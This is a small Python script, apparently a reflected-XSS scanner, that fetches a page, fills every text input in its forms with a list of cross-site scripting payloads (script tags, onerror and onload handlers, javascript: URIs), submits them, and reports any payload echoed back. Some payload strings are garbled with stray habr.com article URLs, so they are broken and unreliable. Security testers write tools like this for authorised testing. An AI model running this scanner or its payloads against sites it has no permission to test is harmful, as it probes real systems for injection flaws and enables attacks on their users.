#!/bin/python3

import requests
from bs4 import BeautifulSoup as bs
import sys

# it's list's of JavaScript payloads
payloads = [
    '<form action="https://habr.com/ru/articles/800243/javascript:alert(\"XSS\')"><input type="submit"></form>',
        '<script>alert("XSS")</script>',
        '"><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")',
        '<body onload=alert("XSS")>',
        '"><svg/onload=alert("XSS")>',
        '<iframe src="https://habr.com/ru/articles/800243/javascript:alert(\"XSS\');">',
        '\'"--><script>alert("XSS")</script>',
        '<img src="https://habr.com/ru/articles/800243/x" onerror="alert(\'XSS\')">',
        '<input type="text" value="<script>alert(\'XSS\')</script>">',
]

def XSSsending(url:str):
    siteResponse = requests.get(url)

    parser = bs(siteResponse.text, 'html.parser')
    forms = parser.find_all('form')
    isXss = False

    for form in forms:
        action = form.get('action')
        method = form.get('method', 'get').lower()

        # testing form to each JavaScript paylaod
        for payload in payloads:
            data = {}

            for tagInput in form.find_all('input'):
                nameInput = tagInput.get('name')
                typeInput = tagInput.get('type', 'text')
                if typeInput == 'text':
                    data[nameInput] = payload
                elif typeInput == 'hidden':
                    data[nameInput] = tagInput.get('value', '')
            
            if method == 'post':
                response = requests.post(url + action, data=data)
            else:
                response = requests.get(url + action, params=data)
            
            if payload in response.text:
                print(f'XSS found: {payload}')
                isXss = True
                break
    
    if not isXss:
        print(f'XSS not found')


if __name__ == "__main__":
    url = sys.argv[1]
    XSSsending(url)